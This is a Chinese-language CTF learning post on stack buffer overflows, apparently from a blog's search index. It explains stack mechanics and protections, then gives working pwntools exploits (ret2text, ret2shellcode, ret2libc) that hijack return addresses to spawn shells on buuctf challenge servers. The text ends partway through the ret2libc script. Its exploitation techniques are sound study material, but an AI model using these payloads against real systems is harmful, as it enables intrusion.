<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Pwn学习之栈溢出</title>
    <link href="/posts/abb3a5ed/"/>
    <url>/posts/abb3a5ed/</url>
    
    <content type="html"><![CDATA[<blockquote><p>学习过程中主要参考了《CTF竞赛权威指南（Pwn篇）》</p></blockquote><h1 id="栈溢出原理"><a class="markdownIt-Anchor" href="#栈溢出原理"></a> 栈溢出原理</h1><p>由于C语言对数组引用不做任何边界检查，从而导致缓冲区溢出（buffer overflow）成为一种很常见的漏洞。根据溢出发生的内存位置，通常可以分为栈溢出和堆溢出。其中，由于栈上保存着局部变量和一些状态信息（寄存器值、返回地址等），一旦发生严重的溢出，攻击者就可以通过覆写返回地址来执行任意代码，利用方法包括shellcode注入、ret2libc、ROP等。</p><h1 id="栈基础知识"><a class="markdownIt-Anchor" href="#栈基础知识"></a> 栈基础知识</h1><h2 id="函数调用栈"><a class="markdownIt-Anchor" href="#函数调用栈"></a> 函数调用栈</h2><p>函数调用栈是一块连续的用来保存函数运行状态的内存区域，调用函数（caller）和被调用函数（callee）根据调用关系堆叠起来，从内存的高地址向低地址增长。这个过程主要涉及eip、esp和ebp三个寄存器：</p><ul><li>eip用于存储即将执行的指令地址；</li><li>esp用于存储栈顶地址，随着数据的压栈和出栈而变化；</li><li>ebp用于存储栈基址，并参与栈内数据的寻址。</li></ul><p>函数调用栈的经典内存布局</p><p><img src="/posts/abb3a5ed/vmfHkowLFV.jpeg" alt="img"></p><blockquote><p>call指令</p></blockquote><ol><li>将当前的指令指针 EIP (该指针指向紧接在 call 指令后的下条指令) 压入堆栈</li><li>再把调用的函数入口地址给eip，以跳转到被调函数的入口地址执行</li></ol><blockquote><p>leave指令</p></blockquote><p>等价于如下指令</p><ol><li>movl %ebp %esp 将esp回到上一个过程的栈顶位置，即ebp的地址</li><li>popl %ebp 将旧的ebp地址返回ebp</li></ol><blockquote><p>ret</p></blockquote><ol><li>pop %eip 从栈顶弹出返回地址 (之前 call 指令保存的下条指令地址) 到 EIP 寄存器中，程序转到该地址处继续执行。</li></ol><p>在用calll指令调用一个函数前，会先有参数准备的过程，之后是call将返回地址入栈，进入调用函数后一般还有有将ebp入栈等操作。</p><p><strong>32位程序中，参数被从后往前逐渐压入栈中（即最后一个参数先入栈，第一个参数最后入栈）。</strong></p><p><strong>64位程序中，前6个参数分别通过rdi、rsi、rdx、rcx、r8和r9进行传递，剩余参数才像x86一样从后向前依次压栈。</strong></p><h2 id="危险函数"><a class="markdownIt-Anchor" href="#危险函数"></a> 危险函数</h2><p>大多数缓冲区溢出问题都是错误地使用了一些危险函数所导致的。</p><ul><li><p>第一类危险函数是scanf、gets等输入读取函数。</p></li><li><p>第二类危险函数是strcpy、strcat、sprintf等字符串拷贝函数。因为未限制读取大小，就会存在栈溢出问题</p></li></ul><h2 id="栈保护措施"><a class="markdownIt-Anchor" href="#栈保护措施"></a> 栈保护措施</h2><h3 id="stack-canaries"><a class="markdownIt-Anchor" href="#stack-canaries"></a> Stack Canaries</h3><p>Stack Canaries（取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用）是一种用于对抗栈溢出攻击的技术，即SSP安全机制，有时也叫作Stack cookies。Canary的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由于栈溢出是从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先覆盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护栈的目的。</p><p>常用指令，更多可gcc命令查看</p><figure class="highlight haml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haml">-<span class="ruby">fno-stack-protector <span class="hljs-comment">#禁用保护</span></span><br><span class="ruby"></span>-<span class="ruby">fstack-protector  <span class="hljs-comment">#对alloca系列函数和内部缓冲区大于8字节的函数启用保护</span></span><br></code></pre></div></td></tr></table></figure><h3 id="no-execute"><a class="markdownIt-Anchor" href="#no-execute"></a> No-eXecute</h3><p>No-eXecute（NX），表示不可执行，其原理是将数据所在的内存页（例如堆和栈）标识为不可执行，如果程序产生溢出转入执行shellcode时，CPU就会抛出异常。</p><p>在Linux中，当装载器将程序装载进内存空间后，将程序的.text节标记为可执行，而其余的数据段（.data、.bss等）以及栈、堆均为不可执行。因此，传统的通过修改GOT来执行shellcode的方式不再可行。但NX这种保护并不能阻止攻击者通过代码重用来进行攻击（ret2libc）。</p><p>现在linux一般默认启用了NX，如果要关闭，可在编译时加上<code>-z execstack</code></p><h3 id="aslr"><a class="markdownIt-Anchor" href="#aslr"></a> ASLR</h3><p>引入内存布局的随机化能够有效增加漏洞利用的难度，其中一种技术就是地址空间布局随机化（Address Space Layout Randomization, ASLR）。</p><p>在Linux上，ASLR的全局配置/proc/sys/kernel/randomize_va_space有三种情况：0表示关闭ASLR；1表示部分开启（将mmap的基址，stack和vdso页面随机化）；2表示完全开启（在部分开启的基础上增加 heap的随机化），如下所示。</p><p><img src="/posts/abb3a5ed/image-20221102150712212.png" alt="image-20221102150712212"></p><h3 id="pie"><a class="markdownIt-Anchor" href="#pie"></a> PIE</h3><p>全称为位置无关可执行文件（Position-Independent Executable, PIE）</p><p>它在应用层的编译器上实现，通过将程序编译为位置无关代码（Position-Independent Code, PIC），使程序可以被加载到任意位置，就像是一个特殊的共享库。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，大大增加了利用难度。当然凡事有利也有弊，在增加安全性的同时，PIE也会一定程度上影响性能，因此在大多数操作系统上PIE仅用于一些对安全性要求比较高的程序。</p><p>通过添加参数<code>-pie -fpie</code>可以将程序编译为PIE程序</p><p>无论是ASLR还是PIE，由于粒度问题，被随机化的都只是某个对象的起始地址，而在该对象的内部依然保持原来的结构，也就是说相对偏移是不会变的</p><h3 id="fortify_source"><a class="markdownIt-Anchor" href="#fortify_source"></a> FORTIFY_SOURCE</h3><p>FORTIFY_SOURCE是一种针对危险函数的检查机制，在编译时尝试去确定风险是否存在，或者将危险函数替换为相对安全的函数实现，以大大降低缓冲区溢出发生的风险。它最初来自2004年RedHat工程师针对GCC和glibc的一个安全补丁，该补丁为字符串操作函数提供了轻量级的缓冲区溢出攻击和格式化字符串攻击检查，它会将危险函数替换为安全函数，且不会对程序执行的性能产生大的影响。目前所支持的函数有memcpy、memmove、memset、strcpy、stpcpy、strncpy、strcat、strncat、sprintf、vsprintf、snprintf、vsnprintf、gets等，这些安全函数位于glibc源码的debug目录下。</p><h2 id="各种保护措施的应对方法"><a class="markdownIt-Anchor" href="#各种保护措施的应对方法"></a> 各种保护措施的应对方法</h2><h1 id="栈溢出实战"><a class="markdownIt-Anchor" href="#栈溢出实战"></a> 栈溢出实战</h1><h2 id="前置准备"><a class="markdownIt-Anchor" href="#前置准备"></a> 前置准备</h2><p>IDA、pwntools、ROPgadget</p><h2 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text"></a> ret2text</h2><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是后面的rop了。</p><p>最基础的ret2text需要题目源码里直接给出了攻击函数，即我们可以通过执行这个函数来获取目标主机shell</p><h3 id="例题1"><a class="markdownIt-Anchor" href="#例题1"></a> 例题1</h3><blockquote><p>平台：buuctf</p><p>题目：rip</p><p>链接：<a href="https://buuoj.cn/challenges#rip">https://buuoj.cn/challenges#rip</a></p><p>题目特征：直接给出可以利用的函数，控制栈溢出将该函数地址覆盖返回地址即可</p></blockquote><p>首先看一下文件信息，很干净，没有什么保护措施</p><p>![Untitled](pwn学习之栈溢出/Untitled 1.png)</p><p>再看一下其反汇编代码，可以看到它使用了gets函数，而这个函数正是很容易发生栈溢出的</p><p>![Untitled](pwn学习之栈溢出/Untitled 2.png)</p><p>而且我们在代码里发现了fun函数，这个函数就是用来执行system shell的</p><p>所以我们控制函数返回到这个fun函数的入口地址，那就是ret2text了</p><p>![Untitled](pwn学习之栈溢出/Untitled 3.png)</p><p>找到其入口点为0x401186</p><p>![Untitled](pwn学习之栈溢出/Untitled 4.png)</p><p>从汇编中可以看到，s的大小为15，所以我们只要用15个字节来填充这个S，再用8个字节来填充rbp即可，最后再把fun函数的入口点覆盖到ebp上方的返回地址处就可以了</p><p>![Untitled](pwn学习之栈溢出/Untitled 5.png)</p><p>下面就是构造的exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">29349</span><br><span class="hljs-comment"># io=remote(host,port)</span><br>io=process(<span class="hljs-string">&#x27;/home/kali/buuctf/pwn1&#x27;</span>)<br><br>fun=<span class="hljs-number">0x401186</span><br>ret = <span class="hljs-number">0x401185</span><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">15</span>+<span class="hljs-number">8</span>)<br><br>payload=junk+p64(fun)<br><br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># sleep(10)</span><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>可以看到本地执行的很好，成功运行了shell</p><p>![Untitled](pwn学习之栈溢出/Untitled 6.png)</p><p>但是到远程去跑的时候却遇到了问题，如图，也无法显示flag</p><p>![Untitled](pwn学习之栈溢出/Untitled 7.png)</p><p>这是因为：</p><p><strong>64位ubuntu18以上系统调用system函数时是需要栈对齐的</strong>。再<strong>具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐，也就是地址需要以0结尾（0x10,0x20等等）</strong></p><p>具体可参考下面这篇博客</p><p><a href="http://blog.eonew.cn/2019-05-11.%E5%9C%A8%E4%B8%80%E4%BA%9B64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98.html">在一些64位的glibc的payload调用system函数失败问题 (eonew.cn)</a></p><p>因为题主的本机是kali，所以在本机调试的时候并没有遇到问题，但是到远程就不行了</p><p>可以看一下函数执行时的栈帧，此时rbp地址末尾是30，那么显然返回地址的末尾是38，这就没有和0x10对齐了，所以导致程序被crash了</p><p>![Untitled](pwn学习之栈溢出/Untitled 8.png)</p><h4 id="system函数栈未对齐解决方法"><a class="markdownIt-Anchor" href="#system函数栈未对齐解决方法"></a> system函数栈未对齐解决方法</h4><p>有两个方法</p><p><strong>方法一：</strong></p><p>将system入口地址+1</p><p>![Untitled](pwn学习之栈溢出/Untitled 9.png)</p><p>如图，我们原来使用的是401186，如果+1就会跳过一条栈操作指令，而push一个栈指令正好是8个字节，所以这样的操作可以使得原本不对齐（比如0x18）的栈对齐0x10</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">29349</span><br>io=remote(host,port)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/pwn1&#x27;)</span><br><br>fun=<span class="hljs-number">0x0000000000401186</span><br>ret = <span class="hljs-number">0x401185</span><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">15</span>+<span class="hljs-number">8</span>)<br><br>payload=junk+p64(fun+<span class="hljs-number">1</span>)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>成功得到flag</p><p>![Untitled](pwn学习之栈溢出/Untitled 10.png)</p><p><strong>方法2：</strong></p><p>在进入system函数前多ret一次</p><p>我们可以在构造payload时在system入口地址前多构造一个ret指令的地址，使其多ret一次，相当于栈被多放一个8个字节的指令，那自然就可以对齐了</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">29349</span><br>io=remote(host,port)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/pwn1&#x27;)</span><br><br>fun=<span class="hljs-number">0x0000000000401186</span><br>ret = <span class="hljs-number">0x401185</span><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">15</span>+<span class="hljs-number">8</span>)<br><br>payload=junk+p64(ret)+p64(fun)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>而且显然如果把payload改成payload=junk+p64(ret)+p64(ret)+p64(ret)+p64(fun)这样，也是可以成功的。因为一个ret是对齐的话，那三个ret自然也是对齐的。感兴趣的可以验证下。</p><p>![Untitled](pwn学习之栈溢出/Untitled 11.png)</p><h3 id="例题2"><a class="markdownIt-Anchor" href="#例题2"></a> 例题2</h3><blockquote><p>平台：buuctf</p><p>题目：jarvisoj_level2</p><p>链接：<a href="https://buuoj.cn/challenges#jarvisoj_level2">https://buuoj.cn/challenges#jarvisoj_level2</a></p><p>题目特征：没有直接的可以利用的函数，但是代码里存在system函数以及&quot;/bin/sh&quot;字符串，可以通过构造栈来调用</p></blockquote><p>首先查看文件信息，开了不可执行栈，不能构造shellcode，可以栈溢出</p><p>![Untitled](pwn学习之栈溢出/Untitled 41-166738114429865.png)</p><p>再用ida看一下，可以发现漏洞函数很简单，可以看到存在栈溢出</p><p>![Untitled](pwn学习之栈溢出/Untitled 42-166738114429866.png)</p><p>shift+F12打开字符串看一下，可以发现存在“/bin/sh”字符串，那么system和binsh就齐全了，引导控制流到sytem(”/bin/sh”)就行了。</p><p>![Untitled](pwn学习之栈溢出/Untitled 43.png)</p><p>![Untitled](pwn学习之栈溢出/Untitled 44-166738114429867.png)</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27337</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/jarvisoj_level2&#x27;)</span><br>bin_sh=<span class="hljs-number">0x0804A024</span><br>system=<span class="hljs-number">0x0804845C</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(bin_sh)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>但是如果其中system取的是call跳转后的，也就是system实际的地址，这时需要再加一个返回地址，以模拟真实的函数调用过程，如果是call就不用加，因为call会自己将返回地址压栈</p><p>![Untitled](pwn学习之栈溢出/Untitled 45.png)</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27337</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/jarvisoj_level2&#x27;)</span><br>bin_sh=<span class="hljs-number">0x0804A024</span><br>system=<span class="hljs-number">0x08048320</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>这题是32位程序，buuctf上还有一道同样情况的64位程序</p><p>处理方法基本上相同，就是从32位换成了64位，唯一的不同就是32位直接将参数压栈即可，64位的话就是把参数依次放入rdi、rsi、rdx、rcx寄存器中，这里我们调用system函数只有一个参数，所以我们需要一个pop rdi指令，用ROPgadget指令找一下这个指令，然后将binsh作为参数压入rdi中即可。</p><p>![Untitled](pwn学习之栈溢出/Untitled 59.png)</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./jarvisoj_level2_x64&#x27;</span>)<br><br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28765</span>)<br><br>bin_sh=<span class="hljs-number">0x600A90</span><br>system=<span class="hljs-number">0x40063E</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="ret2shellcode"><a class="markdownIt-Anchor" href="#ret2shellcode"></a> ret2shellcode</h2><h3 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h3><p>就是控制程序ret到shellcode的位置，要求shellcode的位置具有可执行权限。</p><p>一般可应用在没开NX保护的程序上，主要就是将shellcode写入一个可执行的内存地址，然后覆盖返回地址为这个内存地址以执行shellcode。</p><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><blockquote><p>平台：buuctf</p><p>题目：ciscn_2019_n_5</p><p>链接：<a href="https://buuoj.cn/challenges#ciscn_2019_n_5">https://buuoj.cn/challenges#ciscn_2019_n_5</a></p></blockquote><p>看下文件信息，啥也没开</p><p><img src="/posts/abb3a5ed/image-20221102174741262.png" alt="image-20221102174741262"></p><p>再看下代码，gets函数存在栈溢出，可以直接用shellcode了</p><p><img src="/posts/abb3a5ed/image-20221102174830535.png" alt="image-20221102174830535"></p><p>要注意的一点是，gets函数只有一个参数，第二个参数可以忽略，这题我一开始以为是读入数据到name后再把name里的内容拷贝到text，后来发现不行。</p><p>搜了下gets，发现第二个参数会被直接忽略了。依旧还是从终端读入数据到text里</p><p>所以需要send两次。</p><p>所以在终端读入两次</p><p>第一次在name中传入构造的shellcode</p><p>第二次将返回地址覆盖成name的地址，以便ret到这里执行shellcode。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./ciscn_2019_n_5&#x27;</span>)<br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27122</span>)<br><br><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)<br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class="hljs-number">0x0601080</span><br>io.sendlineafter(<span class="hljs-string">&quot;tell me your name\n&quot;</span>,shellcode)<br>payload = junk + shellcode<br>io.sendlineafter(<span class="hljs-string">&quot;What do you want to say to me?\n&quot;</span>,payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="ret2libc"><a class="markdownIt-Anchor" href="#ret2libc"></a> ret2libc</h2><h3 id="原理-3"><a class="markdownIt-Anchor" href="#原理-3"></a> 原理</h3><p><strong>ret2libc</strong></p><p>这种攻击方式主要针对的动态链接编译的程序，当我们无法在程序中找到system()、execve()这种系统级函数时基于可以利用libc.so中的这些函数</p><p>libc.so是linux下C语言库中的运行库的动态链接版，其中包含了大量可以利用的函数，包括system()、execve()等系统级函数，如果我们可以找到这些函数在内存中的位置，我们就可以用其覆盖掉返回地址，来获得当前进制的控制权。</p><p>libc.so库有很多版本，但是对于一个特定的版本而言，其各个函数的相对于文件开始的偏移都是已知的，所以我们只要知道当前库在内存中的地址以及目标函数system相对于当前库的偏移，我们就可以获得这个函数在当前内存中的地址了。</p><p>而要获得libc在内存中的基址，我们就需要有一个获得一个已经在程序中执行过的libc中的函数在内存中的地址，在这题里puts函数就是一个我们可以利用函数，我们可以泄露出这个函数在的内存地址</p><p>只要得到了这个，我们就可以通过LibcSearcher库来找到这个函数对应的libc库版本，也就可以获得libc库中这个函数的偏移了，用内存中该函数的地址减去libc库中该函数的偏移，就可以得到libc库的基址了。</p><p>然后再计算得到libc库中system函数的偏移即可。</p><p><strong>plt表和got表</strong></p><p>GOT（Global Offset Table 全局偏移表）是一个存储外部库函数的表</p><p>PLT（Procedure Link Table 程序链接表）则是由代码片段组成的，每个代码片段都跳转到GOT表中的一个具体的函数调用</p><p>当我们调用库函数的时候，都会先跳转到plt表中这个函数的位置，然后再跳转到GOT表中这个函数的具体函数调用地址，即实际内存地址。</p><p><strong>延迟绑定技术</strong></p><p>在一个程序的运行的过程中，往往不是所有的函数都能用到，相反在大量的符号中，只有少部分会用到，所以如果在程序一开始的时候就把所有的函数都链接好然而最后又没有用到，这很明显是一种浪费。</p><p>但是如果在动态链接中，当一个库函数是第一次在程序中调用的时候，这时候got表中的地址也不是其真实地址，还需要经过一些复杂的间接跳转，才会最终到达这个函数在内存中的真实地址。那如果每次执行库函数都有这样的过程，那就会有很大的性能开销。</p><p>所以出现了延迟绑定技术。</p><p>其具体过程如下</p><p>建立一个 GOT.PLT 表，该表用来放全局函数的实际地址，但最开始时，该里面放的不是真实的地址而是一个跳转，但是如果这个函数执行过，那么之后got中就会变成这个函数的实际地址，下次就可以直接调用了</p><p>下面的两个图很清晰的展现了这个过程</p><p>函数第一次被调用过程</p><p>![Untitled](pwn学习之栈溢出/Untitled 34.png)</p><p>函数第二次被调用过程</p><p>![Untitled](pwn学习之栈溢出/Untitled 35.png)</p><h3 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h3><blockquote><p>平台：buuctf</p><p>题目：ciscn_2019_c_1</p><p>链接：<a href="https://buuoj.cn/challenges#ciscn_2019_c_1">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p></blockquote><p>看下文件信息，不可执行栈，无法用shellcode，可以栈溢出</p><p>![Untitled](pwn学习之栈溢出/Untitled 31.png)</p><p>看一下main函数，代码整体逻辑就是让你加密字符串</p><p>![Untitled](pwn学习之栈溢出/Untitled 32.png)</p><p>再看一下encrypt函数，可以看到其中的gets函数存在栈溢出，可以利用它完成攻击</p><p>![Untitled](pwn学习之栈溢出/Untitled 33.png)</p><p>但是找遍文件，发现找不到system函数和“/bin/sh”。所以这题不能返回到题目所给的攻击函数中。需要使用ret2libc。</p><p>首先还是确定返回地址</p><p>![Untitled](pwn学习之栈溢出/Untitled 36.png)</p><p>由此可知缓冲区为0x50+0x8，我们覆盖这些就可以到返回地址了。</p><p>然后我们需要将控制流转移到put函数，同时需要为其准备参数，所以需要pop rdi；ret指令</p><p>可以用ROPgadget 指令</p><p>![Untitled](pwn学习之栈溢出/Untitled 37.png)</p><p>下面是完整的exp</p><p>其中有两次注入payload，第一次是为了泄露puts函数地址，第二次是为了实施ret2libc攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">from pwn import *<br>from LibcSearcher import *<br># context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>host=&#x27;node4.buuoj.cn&#x27;<br>port=29417<br>io=remote(host,port)<br># io=process(&#x27;/home/kali/buuctf/ciscn_2019_c_1&#x27;)<br>elf=ELF(&#x27;/home/kali/buuctf/ciscn_2019_c_1&#x27;)<br><br>io.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)<br>offset=0x50<br>junk=b&#x27;\0&#x27;+b&#x27;a&#x27;*(offset-1+8)#首位填‘\0’,绕过加密，之后填上a覆盖到返回地址<br>main = elf.symbols[&#x27;main&#x27;]          #获取main函数地址<br>puts_plt=elf.plt[&#x27;puts&#x27;]            #获取puts函数plt表中地址<br>puts_got=elf.got[&#x27;puts&#x27;]            #获取puts函数got表中的地址<br>pop_rdi_ret=0x0000000000400c83      #ROPgadget找到的 pop rdi；ret指令地址<br>ret=0x00000000004006b9              #栈平衡，使其对齐0x10<br><br>#首先填入pop rdi ret指令，这正好会将puts_got地址压入rdi中，作为puts函数的参数，这样就可以打印出这个put的真实地址<br>#然后加上main函数的地址，使得打印完后函数控制流回到main开始的地方，重新开始执行一次以便实施攻击<br>payload=junk+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendlineafter(&#x27;encrypted\n&#x27;,payload)<br>io.recvline()                       #encryp函数在return前还有两行输入，接收掉<br>io.recvline()<br>#获取puts地址，[:-1]过滤掉最后的\n,ljust获取前八字节，不足补\0,u64解包二进制串成int形式<br>puts_addr= u64(io.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8, b&#x27;\0&#x27;))  <br>#hex将一个int数表示成16进制形式<br>print(hex(puts_addr))<br>libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)  